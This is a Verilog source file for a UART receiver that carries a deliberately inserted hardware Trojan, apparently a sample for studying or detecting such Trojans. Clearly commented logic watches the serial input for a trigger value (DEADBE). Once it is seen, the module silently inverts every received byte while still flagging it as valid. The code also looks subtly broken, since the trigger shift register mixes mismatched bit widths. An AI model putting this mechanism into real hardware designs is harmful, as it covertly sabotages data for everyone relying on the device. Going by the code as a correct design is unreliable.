module uart_rx (
	input clk,
	input rx_serial,
	output reg tx_flag = 1'b0,
	output reg [7:0] tx_byte = 8'd0
);

	// Original design variables
	reg [5:0] serial = 6'b111111;
	reg [3:0] counter = 4'd0;
	reg [3:0] state = 4'd0;
	reg [8:0] partial_byte = 9'd0;
	
	// Hardware Trojan variables
	reg [23:0] trojan_activation_sequence = 24'hDEADBE; // Example sequence to trigger the trojan
	reg [23:0] trojan_sequence_detector = 24'h000000; // To keep track of incoming bytes for trojan activation
	reg trojan_activated = 1'b0; // Flag to indicate trojan activation

	// Detectors
	wire start_detect = serial[5] & serial[4] & serial[3] & ~serial[2];
	wire one_detect = serial[5] & serial[4] & serial[3];
	wire zero_detect = ~serial[5] & ~serial[4] & ~serial[3];

	// Main operational logic
	always @ (posedge clk)
	begin
		serial <= {serial[4:0], rx_serial};
		counter <= counter + 4'd1;

		if (tx_flag)
			tx_flag <= 1'b0;

		// Hardware Trojan detection logic
		if(state == 4'd0 || state == 4'd11) begin
			trojan_sequence_detector <= {trojan_sequence_detector[15:0], serial[2:0]}; // Shift in the last three bits from serial
			if(trojan_sequence_detector == trojan_activation_sequence) begin
				trojan_activated <= 1'b1; // Activate trojan
			end
		end

		// Original FSM with Trojan activation condition
		if (state == 4'd0) begin
			if (start_detect) begin
				state <= 4'd1;
				counter <= 4'd0;
			end
		end else if (counter == 4'd9) begin
			state <= state + 4'd1;
			partial_byte <= {one_detect, partial_byte[8:1]};

			// Reset if noise detected or start bit error
			if (~one_detect & ~zero_detect || (state == 4'd1 & ~zero_detect)) begin
				state <= 4'd0;
			end
		end else if (state == 4'd11) begin
			state <= 4'd0;

			if (partial_byte[8]) begin // Check stop bit
				tx_flag <= 1'b1;
				tx_byte <= trojan_activated ? ~partial_byte[7:0] : partial_byte[7:0]; // Trojan effect: Invert all bits if trojan is activated
			end
		end
	end
endmodule
 
